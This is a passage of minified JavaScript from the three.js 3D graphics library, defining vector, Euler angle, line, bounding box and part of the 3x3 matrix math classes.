Math.sqrt(this.x*this.x+this.y*this.y)},normalize:function(){return this.divideScalar(this.length())},distanceTo:function(e){return Math.sqrt(this.distanceToSquared(e))},distanceToSquared:function(e){var t=this.x-e.x,r=this.y-e.y;return t*t+r*r},setLength:function(e){var t=this.length();return 0!==t&&e!==t&&this.multiplyScalar(e/t),this},lerp:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this},lerpVectors:function(e,t,r){return this.subVectors(t,e).multiplyScalar(r).add(e),this},equals:function(e){return e.x===this.x&&e.y===this.y},fromArray:function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e},fromAttribute:function(e,t,r){return void 0===r&&(r=0),t=t*e.itemSize+r,this.x=e.array[t],this.y=e.array[t+1],this},clone:function(){return new THREE.Vector2(this.x,this.y)}},THREE.Vector3=function(e,t,r){this.x=e||0,this.y=t||0,this.z=r||0},THREE.Vector3.prototype={constructor:THREE.Vector3,set:function(e,t,r){return this.x=e,this.y=t,this.z=r,this},setX:function(e){return this.x=e,this},setY:function(e){return this.y=e,this},setZ:function(e){return this.z=e,this},setComponent:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;default:throw new Error("index is out of range: "+e)}},getComponent:function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}},copy:function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this},add:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(e,t)):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this)},addScalar:function(e){return this.x+=e,this.y+=e,this.z+=e,this},addVectors:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this},sub:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(e,t)):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this)},subScalar:function(e){return this.x-=e,this.y-=e,this.z-=e,this},subVectors:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this},multiply:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead."),this.multiplyVectors(e,t)):(this.x*=e.x,this.y*=e.y,this.z*=e.z,this)},multiplyScalar:function(e){return this.x*=e,this.y*=e,this.z*=e,this},multiplyVectors:function(e,t){return this.x=e.x*t.x,this.y=e.y*t.y,this.z=e.z*t.z,this},applyEuler:function(){var e;return function(t){return t instanceof THREE.Euler==!1&&THREE.error("THREE.Vector3: .applyEuler() now expects a Euler rotation rather than a Vector3 and order."),void 0===e&&(e=new THREE.Quaternion),this.applyQuaternion(e.setFromEuler(t)),this}}(),applyAxisAngle:function(){var e;return function(t,r){return void 0===e&&(e=new THREE.Quaternion),this.applyQuaternion(e.setFromAxisAngle(t,r)),this}}(),applyMatrix3:function(e){var t=this.x,r=this.y,i=this.z,n=e.elements;return this.x=n[0]*t+n[3]*r+n[6]*i,this.y=n[1]*t+n[4]*r+n[7]*i,this.z=n[2]*t+n[5]*r+n[8]*i,this},applyMatrix4:function(e){var t=this.x,r=this.y,i=this.z,n=e.elements;return this.x=n[0]*t+n[4]*r+n[8]*i+n[12],this.y=n[1]*t+n[5]*r+n[9]*i+n[13],this.z=n[2]*t+n[6]*r+n[10]*i+n[14],this},applyProjection:function(e){var t=this.x,r=this.y,i=this.z,n=e.elements,a=1/(n[3]*t+n[7]*r+n[11]*i+n[15]);return this.x=(n[0]*t+n[4]*r+n[8]*i+n[12])*a,this.y=(n[1]*t+n[5]*r+n[9]*i+n[13])*a,this.z=(n[2]*t+n[6]*r+n[10]*i+n[14])*a,this},applyQuaternion:function(e){var t=this.x,r=this.y,i=this.z,n=e.x,a=e.y,o=e.z,s=e.w,h=s*t+a*i-o*r,l=s*r+o*t-n*i,c=s*i+n*r-a*t,u=-n*t-a*r-o*i;return this.x=h*s+u*-n+l*-o-c*-a,this.y=l*s+u*-a+c*-n-h*-o,this.z=c*s+u*-o+h*-a-l*-n,this},project:function(){var e;return function(t){return void 0===e&&(e=new THREE.Matrix4),e.multiplyMatrices(t.projectionMatrix,e.getInverse(t.matrixWorld)),this.applyProjection(e)}}(),unproject:function(){var e;return function(t){return void 0===e&&(e=new THREE.Matrix4),e.multiplyMatrices(t.matrixWorld,e.getInverse(t.projectionMatrix)),this.applyProjection(e)}}(),transformDirection:function(e){var t=this.x,r=this.y,i=this.z,n=e.elements;return this.x=n[0]*t+n[4]*r+n[8]*i,this.y=n[1]*t+n[5]*r+n[9]*i,this.z=n[2]*t+n[6]*r+n[10]*i,this.normalize(),this},divide:function(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this},divideScalar:function(e){if(0!==e){var t=1/e;this.x*=t,this.y*=t,this.z*=t}else this.x=0,this.y=0,this.z=0;return this},min:function(e){return this.x>e.x&&(this.x=e.x),this.y>e.y&&(this.y=e.y),this.z>e.z&&(this.z=e.z),this},max:function(e){return this.x<e.x&&(this.x=e.x),this.y<e.y&&(this.y=e.y),this.z<e.z&&(this.z=e.z),this},clamp:function(e,t){return this.x<e.x?this.x=e.x:this.x>t.x&&(this.x=t.x),this.y<e.y?this.y=e.y:this.y>t.y&&(this.y=t.y),this.z<e.z?this.z=e.z:this.z>t.z&&(this.z=t.z),this},clampScalar:function(){var e,t;return function(r,i){return void 0===e&&(e=new THREE.Vector3,t=new THREE.Vector3),e.set(r,r,r),t.set(i,i,i),this.clamp(e,t)}}(),floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this},dot:function(e){return this.x*e.x+this.y*e.y+this.z*e.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},setLength:function(e){var t=this.length();return 0!==t&&e!==t&&this.multiplyScalar(e/t),this},lerp:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this},lerpVectors:function(e,t,r){return this.subVectors(t,e).multiplyScalar(r).add(e),this},cross:function(e,t){if(void 0!==t)return THREE.warn("THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead."),this.crossVectors(e,t);var r=this.x,i=this.y,n=this.z;return this.x=i*e.z-n*e.y,this.y=n*e.x-r*e.z,this.z=r*e.y-i*e.x,this},crossVectors:function(e,t){var r=e.x,i=e.y,n=e.z,a=t.x,o=t.y,s=t.z;return this.x=i*s-n*o,this.y=n*a-r*s,this.z=r*o-i*a,this},projectOnVector:function(){var e,t;return function(r){return void 0===e&&(e=new THREE.Vector3),e.copy(r).normalize(),t=this.dot(e),this.copy(e).multiplyScalar(t)}}(),projectOnPlane:function(){var e;return function(t){return void 0===e&&(e=new THREE.Vector3),e.copy(this).projectOnVector(t),this.sub(e)}}(),reflect:function(){var e;return function(t){return void 0===e&&(e=new THREE.Vector3),this.sub(e.copy(t).multiplyScalar(2*this.dot(t)))}}(),angleTo:function(e){var t=this.dot(e)/(this.length()*e.length());return Math.acos(THREE.Math.clamp(t,-1,1))},distanceTo:function(e){return Math.sqrt(this.distanceToSquared(e))},distanceToSquared:function(e){var t=this.x-e.x,r=this.y-e.y,i=this.z-e.z;return t*t+r*r+i*i},setEulerFromRotationMatrix:function(e,t){THREE.error("THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.")},setEulerFromQuaternion:function(e,t){THREE.error("THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.")},getPositionFromMatrix:function(e){return THREE.warn("THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition()."),this.setFromMatrixPosition(e)},getScaleFromMatrix:function(e){return THREE.warn("THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale()."),this.setFromMatrixScale(e)},getColumnFromMatrix:function(e,t){return THREE.warn("THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn()."),this.setFromMatrixColumn(e,t)},setFromMatrixPosition:function(e){return this.x=e.elements[12],this.y=e.elements[13],this.z=e.elements[14],this},setFromMatrixScale:function(e){var t=this.set(e.elements[0],e.elements[1],e.elements[2]).length(),r=this.set(e.elements[4],e.elements[5],e.elements[6]).length(),i=this.set(e.elements[8],e.elements[9],e.elements[10]).length();return this.x=t,this.y=r,this.z=i,this},setFromMatrixColumn:function(e,t){var r=4*e,i=t.elements;return this.x=i[r],this.y=i[r+1],this.z=i[r+2],this},equals:function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z},fromArray:function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this.z=e[t+2],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e},fromAttribute:function(e,t,r){return void 0===r&&(r=0),t=t*e.itemSize+r,this.x=e.array[t],this.y=e.array[t+1],this.z=e.array[t+2],this},clone:function(){return new THREE.Vector3(this.x,this.y,this.z)}},THREE.Vector4=function(e,t,r,i){this.x=e||0,this.y=t||0,this.z=r||0,this.w=void 0!==i?i:1},THREE.Vector4.prototype={constructor:THREE.Vector4,set:function(e,t,r,i){return this.x=e,this.y=t,this.z=r,this.w=i,this},setX:function(e){return this.x=e,this},setY:function(e){return this.y=e,this},setZ:function(e){return this.z=e,this},setW:function(e){return this.w=e,this},setComponent:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;case 3:this.w=t;break;default:throw new Error("index is out of range: "+e)}},getComponent:function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}},copy:function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=void 0!==e.w?e.w:1,this},add:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(e,t)):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this)},addScalar:function(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this},addVectors:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this.w=e.w+t.w,this},sub:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(e,t)):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this)},subScalar:function(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this},subVectors:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this.w=e.w-t.w,this},multiplyScalar:function(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this},applyMatrix4:function(e){var t=this.x,r=this.y,i=this.z,n=this.w,a=e.elements;return this.x=a[0]*t+a[4]*r+a[8]*i+a[12]*n,this.y=a[1]*t+a[5]*r+a[9]*i+a[13]*n,this.z=a[2]*t+a[6]*r+a[10]*i+a[14]*n,this.w=a[3]*t+a[7]*r+a[11]*i+a[15]*n,this},divideScalar:function(e){if(0!==e){var t=1/e;this.x*=t,this.y*=t,this.z*=t,this.w*=t}else this.x=0,this.y=0,this.z=0,this.w=1;return this},setAxisAngleFromQuaternion:function(e){this.w=2*Math.acos(e.w);var t=Math.sqrt(1-e.w*e.w);return 1e-4>t?(this.x=1,this.y=0,this.z=0):(this.x=e.x/t,this.y=e.y/t,this.z=e.z/t),this},setAxisAngleFromRotationMatrix:function(e){var t,r,i,n,a=.01,o=.1,s=e.elements,h=s[0],l=s[4],c=s[8],u=s[1],E=s[5],f=s[9],p=s[2],d=s[6],m=s[10];if(Math.abs(l-u)<a&&Math.abs(c-p)<a&&Math.abs(f-d)<a){if(Math.abs(l+u)<o&&Math.abs(c+p)<o&&Math.abs(f+d)<o&&Math.abs(h+E+m-3)<o)return this.set(1,0,0,0),this;t=Math.PI;var T=(h+1)/2,g=(E+1)/2,v=(m+1)/2,R=(l+u)/4,y=(c+p)/4,H=(f+d)/4;return T>g&&T>v?a>T?(r=0,i=.707106781,n=.707106781):(r=Math.sqrt(T),i=R/r,n=y/r):g>v?a>g?(r=.707106781,i=0,n=.707106781):(i=Math.sqrt(g),r=R/i,n=H/i):a>v?(r=.707106781,i=.707106781,n=0):(n=Math.sqrt(v),r=y/n,i=H/n),this.set(r,i,n,t),this}var x=Math.sqrt((d-f)*(d-f)+(c-p)*(c-p)+(u-l)*(u-l));return Math.abs(x)<.001&&(x=1),this.x=(d-f)/x,this.y=(c-p)/x,this.z=(u-l)/x,this.w=Math.acos((h+E+m-1)/2),this},min:function(e){return this.x>e.x&&(this.x=e.x),this.y>e.y&&(this.y=e.y),this.z>e.z&&(this.z=e.z),this.w>e.w&&(this.w=e.w),this},max:function(e){return this.x<e.x&&(this.x=e.x),this.y<e.y&&(this.y=e.y),this.z<e.z&&(this.z=e.z),this.w<e.w&&(this.w=e.w),this},clamp:function(e,t){return this.x<e.x?this.x=e.x:this.x>t.x&&(this.x=t.x),this.y<e.y?this.y=e.y:this.y>t.y&&(this.y=t.y),this.z<e.z?this.z=e.z:this.z>t.z&&(this.z=t.z),this.w<e.w?this.w=e.w:this.w>t.w&&(this.w=t.w),this},clampScalar:function(){var e,t;return function(r,i){return void 0===e&&(e=new THREE.Vector4,t=new THREE.Vector4),e.set(r,r,r,r),t.set(i,i,i,i),this.clamp(e,t)}}(),floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this.w=this.w<0?Math.ceil(this.w):Math.floor(this.w),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this},dot:function(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(e){var t=this.length();return 0!==t&&e!==t&&this.multiplyScalar(e/t),this},lerp:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this.w+=(e.w-this.w)*t,this},lerpVectors:function(e,t,r){return this.subVectors(t,e).multiplyScalar(r).add(e),this},equals:function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w},fromArray:function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this.z=e[t+2],this.w=e[t+3],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e[t+3]=this.w,e},fromAttribute:function(e,t,r){return void 0===r&&(r=0),t=t*e.itemSize+r,this.x=e.array[t],this.y=e.array[t+1],this.z=e.array[t+2],this.w=e.array[t+3],this;
},clone:function(){return new THREE.Vector4(this.x,this.y,this.z,this.w)}},THREE.Euler=function(e,t,r,i){this._x=e||0,this._y=t||0,this._z=r||0,this._order=i||THREE.Euler.DefaultOrder},THREE.Euler.RotationOrders=["XYZ","YZX","ZXY","XZY","YXZ","ZYX"],THREE.Euler.DefaultOrder="XYZ",THREE.Euler.prototype={constructor:THREE.Euler,_x:0,_y:0,_z:0,_order:THREE.Euler.DefaultOrder,get x(){return this._x},set x(e){this._x=e,this.onChangeCallback()},get y(){return this._y},set y(e){this._y=e,this.onChangeCallback()},get z(){return this._z},set z(e){this._z=e,this.onChangeCallback()},get order(){return this._order},set order(e){this._order=e,this.onChangeCallback()},set:function(e,t,r,i){return this._x=e,this._y=t,this._z=r,this._order=i||this._order,this.onChangeCallback(),this},copy:function(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this.onChangeCallback(),this},setFromRotationMatrix:function(e,t,r){var i=THREE.Math.clamp,n=e.elements,a=n[0],o=n[4],s=n[8],h=n[1],l=n[5],c=n[9],u=n[2],E=n[6],f=n[10];return t=t||this._order,"XYZ"===t?(this._y=Math.asin(i(s,-1,1)),Math.abs(s)<.99999?(this._x=Math.atan2(-c,f),this._z=Math.atan2(-o,a)):(this._x=Math.atan2(E,l),this._z=0)):"YXZ"===t?(this._x=Math.asin(-i(c,-1,1)),Math.abs(c)<.99999?(this._y=Math.atan2(s,f),this._z=Math.atan2(h,l)):(this._y=Math.atan2(-u,a),this._z=0)):"ZXY"===t?(this._x=Math.asin(i(E,-1,1)),Math.abs(E)<.99999?(this._y=Math.atan2(-u,f),this._z=Math.atan2(-o,l)):(this._y=0,this._z=Math.atan2(h,a))):"ZYX"===t?(this._y=Math.asin(-i(u,-1,1)),Math.abs(u)<.99999?(this._x=Math.atan2(E,f),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-o,l))):"YZX"===t?(this._z=Math.asin(i(h,-1,1)),Math.abs(h)<.99999?(this._x=Math.atan2(-c,l),this._y=Math.atan2(-u,a)):(this._x=0,this._y=Math.atan2(s,f))):"XZY"===t?(this._z=Math.asin(-i(o,-1,1)),Math.abs(o)<.99999?(this._x=Math.atan2(E,l),this._y=Math.atan2(s,a)):(this._x=Math.atan2(-c,f),this._y=0)):THREE.warn("THREE.Euler: .setFromRotationMatrix() given unsupported order: "+t),this._order=t,r!==!1&&this.onChangeCallback(),this},setFromQuaternion:function(){var e;return function(t,r,i){return void 0===e&&(e=new THREE.Matrix4),e.makeRotationFromQuaternion(t),this.setFromRotationMatrix(e,r,i),this}}(),setFromVector3:function(e,t){return this.set(e.x,e.y,e.z,t||this._order)},reorder:function(){var e=new THREE.Quaternion;return function(t){e.setFromEuler(this),this.setFromQuaternion(e,t)}}(),equals:function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order},fromArray:function(e){return this._x=e[0],this._y=e[1],this._z=e[2],void 0!==e[3]&&(this._order=e[3]),this.onChangeCallback(),this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._order,e},toVector3:function(e){return e?e.set(this._x,this._y,this._z):new THREE.Vector3(this._x,this._y,this._z)},onChange:function(e){return this.onChangeCallback=e,this},onChangeCallback:function(){},clone:function(){return new THREE.Euler(this._x,this._y,this._z,this._order)}},THREE.Line3=function(e,t){this.start=void 0!==e?e:new THREE.Vector3,this.end=void 0!==t?t:new THREE.Vector3},THREE.Line3.prototype={constructor:THREE.Line3,set:function(e,t){return this.start.copy(e),this.end.copy(t),this},copy:function(e){return this.start.copy(e.start),this.end.copy(e.end),this},center:function(e){var t=e||new THREE.Vector3;return t.addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(e){var t=e||new THREE.Vector3;return t.subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(e,t){var r=t||new THREE.Vector3;return this.delta(r).multiplyScalar(e).add(this.start)},closestPointToPointParameter:function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(r,i){e.subVectors(r,this.start),t.subVectors(this.end,this.start);var n=t.dot(t),a=t.dot(e),o=a/n;return i&&(o=THREE.Math.clamp(o,0,1)),o}}(),closestPointToPoint:function(e,t,r){var i=this.closestPointToPointParameter(e,t),n=r||new THREE.Vector3;return this.delta(n).multiplyScalar(i).add(this.start)},applyMatrix4:function(e){return this.start.applyMatrix4(e),this.end.applyMatrix4(e),this},equals:function(e){return e.start.equals(this.start)&&e.end.equals(this.end)},clone:function(){return(new THREE.Line3).copy(this)}},THREE.Box2=function(e,t){this.min=void 0!==e?e:new THREE.Vector2(1/0,1/0),this.max=void 0!==t?t:new THREE.Vector2(-(1/0),-(1/0))},THREE.Box2.prototype={constructor:THREE.Box2,set:function(e,t){return this.min.copy(e),this.max.copy(t),this},setFromPoints:function(e){this.makeEmpty();for(var t=0,r=e.length;r>t;t++)this.expandByPoint(e[t]);return this},setFromCenterAndSize:function(){var e=new THREE.Vector2;return function(t,r){var i=e.copy(r).multiplyScalar(.5);return this.min.copy(t).sub(i),this.max.copy(t).add(i),this}}(),copy:function(e){return this.min.copy(e.min),this.max.copy(e.max),this},makeEmpty:function(){return this.min.x=this.min.y=1/0,this.max.x=this.max.y=-(1/0),this},empty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},center:function(e){var t=e||new THREE.Vector2;return t.addVectors(this.min,this.max).multiplyScalar(.5)},size:function(e){var t=e||new THREE.Vector2;return t.subVectors(this.max,this.min)},expandByPoint:function(e){return this.min.min(e),this.max.max(e),this},expandByVector:function(e){return this.min.sub(e),this.max.add(e),this},expandByScalar:function(e){return this.min.addScalar(-e),this.max.addScalar(e),this},containsPoint:function(e){return e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y?!1:!0},containsBox:function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y?!0:!1},getParameter:function(e,t){var r=t||new THREE.Vector2;return r.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y))},isIntersectionBox:function(e){return e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y?!1:!0},clampPoint:function(e,t){var r=t||new THREE.Vector2;return r.copy(e).clamp(this.min,this.max)},distanceToPoint:function(){var e=new THREE.Vector2;return function(t){var r=e.copy(t).clamp(this.min,this.max);return r.sub(t).length()}}(),intersect:function(e){return this.min.max(e.min),this.max.min(e.max),this},union:function(e){return this.min.min(e.min),this.max.max(e.max),this},translate:function(e){return this.min.add(e),this.max.add(e),this},equals:function(e){return e.min.equals(this.min)&&e.max.equals(this.max)},clone:function(){return(new THREE.Box2).copy(this)}},THREE.Box3=function(e,t){this.min=void 0!==e?e:new THREE.Vector3(1/0,1/0,1/0),this.max=void 0!==t?t:new THREE.Vector3(-(1/0),-(1/0),-(1/0))},THREE.Box3.prototype={constructor:THREE.Box3,set:function(e,t){return this.min.copy(e),this.max.copy(t),this},setFromPoints:function(e){this.makeEmpty();for(var t=0,r=e.length;r>t;t++)this.expandByPoint(e[t]);return this},setFromCenterAndSize:function(){var e=new THREE.Vector3;return function(t,r){var i=e.copy(r).multiplyScalar(.5);return this.min.copy(t).sub(i),this.max.copy(t).add(i),this}}(),setFromObject:function(){var e=new THREE.Vector3;return function(t){var r=this;return t.updateMatrixWorld(!0),this.makeEmpty(),t.traverse(function(t){var i=t.geometry;if(void 0!==i)if(i instanceof THREE.Geometry)for(var n=i.vertices,a=0,o=n.length;o>a;a++)e.copy(n[a]),e.applyMatrix4(t.matrixWorld),r.expandByPoint(e);else if(i instanceof THREE.BufferGeometry&&void 0!==i.attributes.position)for(var s=i.attributes.position.array,a=0,o=s.length;o>a;a+=3)e.set(s[a],s[a+1],s[a+2]),e.applyMatrix4(t.matrixWorld),r.expandByPoint(e)}),this}}(),copy:function(e){return this.min.copy(e.min),this.max.copy(e.max),this},makeEmpty:function(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-(1/0),this},empty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},center:function(e){var t=e||new THREE.Vector3;return t.addVectors(this.min,this.max).multiplyScalar(.5)},size:function(e){var t=e||new THREE.Vector3;return t.subVectors(this.max,this.min)},expandByPoint:function(e){return this.min.min(e),this.max.max(e),this},expandByVector:function(e){return this.min.sub(e),this.max.add(e),this},expandByScalar:function(e){return this.min.addScalar(-e),this.max.addScalar(e),this},containsPoint:function(e){return e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y||e.z<this.min.z||e.z>this.max.z?!1:!0},containsBox:function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z?!0:!1},getParameter:function(e,t){var r=t||new THREE.Vector3;return r.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))},isIntersectionBox:function(e){return e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y||e.max.z<this.min.z||e.min.z>this.max.z?!1:!0},clampPoint:function(e,t){var r=t||new THREE.Vector3;return r.copy(e).clamp(this.min,this.max)},distanceToPoint:function(){var e=new THREE.Vector3;return function(t){var r=e.copy(t).clamp(this.min,this.max);return r.sub(t).length()}}(),getBoundingSphere:function(){var e=new THREE.Vector3;return function(t){var r=t||new THREE.Sphere;return r.center=this.center(),r.radius=.5*this.size(e).length(),r}}(),intersect:function(e){return this.min.max(e.min),this.max.min(e.max),this},union:function(e){return this.min.min(e.min),this.max.max(e.max),this},applyMatrix4:function(){var e=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3];return function(t){return e[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(t),e[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(t),e[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(t),e[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(t),e[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(t),e[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(t),e[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(t),e[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(t),this.makeEmpty(),this.setFromPoints(e),this}}(),translate:function(e){return this.min.add(e),this.max.add(e),this},equals:function(e){return e.min.equals(this.min)&&e.max.equals(this.max)},clone:function(){return(new THREE.Box3).copy(this)}},THREE.Matrix3=function(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]),arguments.length>0&&THREE.error("THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.")},THREE.Matrix3.prototype={constructor:THREE.Matrix3,set:function(e,t,r,i,n,a,o,s,h){var l=this.elements;return l[0]=e,l[3]=t,l[6]=r,l[1]=i,l[4]=n,l[7]=a,l[2]=o,l[5]=s,l[8]=h,this},identity:function(){return this.set(1,0,0,0,1,0,0,0,1),this},copy:function(e){var t=e.elements;return this.set(t[0],t[3],t[6],t[1],t[4],t[7],t[2],t[5],t[8]),this},multiplyVector3:function(e){return THREE.warn("THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead."),e.applyMatrix3(this)},multiplyVector3Array:function(e){return THREE.warn("THREE.Matrix3: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead."),this.applyToVector3Array(e)},applyToVector3Array:function(){var e=new THREE.Vector3;return function(t,r,i){void 0===r&&(r=0),void 0===i&&(i=t.length);for(var n=0,a=r;i>n;n+=3,a+=3)e.x=t[a],e.y=t[a+1],e.z=t[a+2],e.applyMatrix3(this),t[a]=e.x,t[a+1]=e.y,t[a+2]=e.z;return t}}(),multiplyScalar:function(e){var t=this.elements;return t[0]*=e,t[3]*=e,t[6]*=e,t[1]*=e,t[4]*=e,t[7]*=e,t[2]*=e,t[5]*=e,t[8]*=e,this},determinant:function(){var e=this.elements,t=e[0],r=e[1],i=e[2],n=e[3],a=e[4],o=e[5],s=e[6],h=e[7],l=e[8];return t*a*l-t*o*h-r*n*l+r*o*s+i*n*h-i*a*s},getInverse:function(e,t){var r=e.elements,i=this.elements;i[0]=r[10]*r[5]-r[6]*r[9],i[1]=-r[10]*r[1]+r[2]*r[9],i[2]=r[6]*r[1]-r[2]*r[5],i[3]=-r[10]*r[4]+r[6]*r[8],i[4]=r[10]*r[0]-r[2]*r[8],i[5]=-r[6]*r[0]+r[2]*r[4],i[6]=r[9]*r[4]-r[5]*r[8],i[7]=-r[9]*r[0]+r[1]*r[8],i[8]=r[5]*r[0]-r[1]*r[4];var n=r[0]*i[0]+r[1]*i[3]+r[2]*i[6];if(0===n){var a="Matrix3.getInverse(): can't invert matrix, determinant is 0";if(t)throw new Error(a);return THREE.warn(a),this.identity(),this}return this.multiplyScalar(1/n),this},transpose:function(){var e,t=this.elements;return 